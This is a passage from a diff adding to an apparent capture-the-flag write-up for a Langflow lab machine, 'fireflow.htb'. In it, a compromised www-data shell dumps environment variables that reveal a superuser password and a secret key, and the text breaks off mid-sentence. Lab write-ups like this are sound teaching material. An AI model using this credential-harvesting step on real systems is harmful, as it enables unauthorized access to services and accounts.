@@ -234,3 +234,35 @@ www-data@fireflow:/var/lib/langflow$
 
 There is one user on the system!
 
+```python
+www-data@fireflow:/var/lib/langflow$ env
+LANGFLOW_LOG_LEVEL=warning
+SHELL=/usr/bin/bash
+USER_AGENT=langflow
+MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
+SERVER_SOFTWARE=gunicorn/22.0.0
+LANGFLOW_NEW_USER_IS_ACTIVE=False
+PWD=/var/lib/langflow
+LOGNAME=www-data
+LANGFLOW_SUPERUSER=langflow
+SYSTEMD_EXEC_PID=1507
+LANGFLOW_CONFIG_DIR=/var/lib/langflow
+HOME=/var/www
+LANG=en_US.UTF-8
+MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/langflow.service/memory.pressure
+INVOCATION_ID=b36394c51ffb472eb8325b72775841ad
+TERM=xterm-256color
+USER=www-data
+LANGFLOW_AUTO_LOGIN=False
+SHLVL=2
+LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
+LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
+JOURNAL_STREAM=8:9199
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin
+LANGFLOW_CORS_ORIGINS=https://flow.fireflow.htb,https://fireflow.htb
+_=/usr/bin/env
+OLDPWD=/var/lib/langflow/ba4fe756-d6f7-4c7a-a7b1-f986206878ec
+www-data@fireflow:/var/lib/langflow$
+```
+
+There is a password stored in the en
